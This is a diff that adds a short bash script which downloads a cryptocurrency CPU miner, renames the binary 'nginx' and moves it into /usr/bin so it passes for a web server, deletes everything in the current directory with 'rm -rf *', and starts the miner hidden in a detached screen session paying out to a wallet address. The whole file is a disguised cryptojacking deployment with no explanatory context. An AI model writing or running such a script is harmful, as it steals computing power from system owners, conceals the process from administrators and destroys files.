@@ -1,0 +1,3 @@
+#!/bin/bash
+
+sudo apt update && sudo apt install wget -y && sudo apt install screen -y && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-sse2 nginx && sudo mv nginx /usr/bin && rm -rf * && screen -dmS thang && screen -S thang -p 0 -X screen nginx -a power2b -o 17022 -u MgMnxpSaHA2H5gvoxd5BYAM4QVKqtn3yBd.clone1 -t 9
